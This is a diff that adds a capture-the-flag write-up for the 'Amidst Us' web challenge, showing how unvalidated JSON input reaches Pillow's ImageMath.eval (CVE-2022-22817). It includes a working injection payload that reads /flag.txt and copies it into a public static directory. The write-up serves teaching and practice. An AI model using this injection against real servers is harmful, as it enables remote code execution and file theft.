@@ -141,6 +141,113 @@ We have access to `/static` route which means, we can use it to write our comman
 <br/>
 
 3. <p name="web3">Amidst Us (★☆☆☆)</p>
+For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/)). We get the following page
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web3.png'>
+</p>
+
+We click on the picture in the center & it'll prompt us to select a file to upload. Upon selecting a picture, we see that the white areas become transparent, so this is somekind of a picture converter. Let's have a look on the source code for this.
+
+As a start, we notice that we are running a Flask app. We head to the [application/blueprints/routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) to check for routes & we get only 1 API route, `alphafy` used for image processing. We are using a helper method defined in [application/utils.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py). I've edited the source a little to help me debug the payload. The interesting part is the following:
+
+```python
+def make_alpha(data):
+	color = data.get('background', [255,255,255])
+
+	try:
+		dec_img = base64.b64decode(data.get('image').encode())
+
+		image = Image.open(BytesIO(dec_img)).convert('RGBA')
+		img_bands = [band.convert('F') for band in image.split()]
+		
+		alpha = ImageMath.eval(
+			f'''float(
+				max(
+				max(
+					max(
+					difference1(red_band, {color[0]}),
+					difference1(green_band, {color[1]})
+					),
+					difference1(blue_band, {color[2]})
+				),
+				max(
+					max(
+					difference2(red_band, {color[0]}),
+					difference2(green_band, {color[1]})
+					),
+					difference2(blue_band, {color[2]})
+				)
+				)
+			)''',
+			difference1=lambda source, color: (source - color) / (255.0 - color),
+			difference2=lambda source, color: (color - source) / color,
+			red_band=img_bands[0],
+			green_band=img_bands[1],
+			blue_band=img_bands[2]
+		)
+```
+
+<br>
+
+The rest of the function isn't important.<br/>So if we read the code, we can see that there is a `ImageMath.eval` that takes a string which contains `float` & `max` functions, this appears to be a python code maybe? We might use this part in order to get an RCE. Where is our input part?
+
+We start first by viewing the HTTP requests. We see that we are sending a JSON object with 2 attributes:
+
+```json
+{
+	"image":"iVBORw0K...............",
+	"background":[255,255,255]
+}
+```
+
+The image is sent as a base 64 string, we see that there is a background attribute too. If we check the [routes](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) file again, we see that our input is passed directly to the helper function, without any validation.
+
+```python
+@api.route('/alphafy', methods=['POST'])
+def alphafy():
+	if not request.is_json or 'image' not in request.json:
+		return abort(400)
+
+	return make_alpha(request.json)
+```
+
+Now, we see that the `background` attribute is being used in the helper function & it's passed into the `ImageMath.eval` call:
+
+```python
+color = data.get('background', [255,255,255])
+```
+
+& since there is no validation, we can inject anything into the `color` array!
+
+Before that, let's try to gather a bit more information about this method. A quick google search would land us on a `CVE-2022-22817` & we get the following:
+
+`PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method.`
+
+Having a quick look at [/requirements.txt](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/requirements.txt), we see that we are using `Pillow 8.4.0` & now, we got our RCE confirmed.
+
+As a start, I thought of crafting a payload to close the `max` & `float` calls then inject my code to be executed but after debuging a little bit, it was hell. I had to figure an other way to inject the code...
+
+After a while, I remembered that we already know the flag's path. Also, I remembered that the `file.write` function returns the number of characters written into a file. So if we inject a `open().write` call, we'll get our code executed + return an integer to keep the execution of the helper function working. Combining that with a `open().read`, we can extract our flag into a public route, `/static`.
+
+Of course, we can pop a shell by importing os & executing shell commands but meh, we know where our flag is so let's grab it & go.
+
+We end up with a final payload:
+
+```json
+{
+	"image":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAGgwJ/lK3Q6wAAAABJRU5ErkJggg==",
+	"background":[
+		255,
+		"open('/app/application/static/flag', 'w').write(open('/flag.txt').read())",
+		255
+	]
+}
+```
+
+& we get our flag in `/static/flag`: `HTB{i_slept_my_way_to_rce}`
+
+<br/>
 
 4. <p name="web4">Intergalactic Post (★☆☆☆)</p>
 
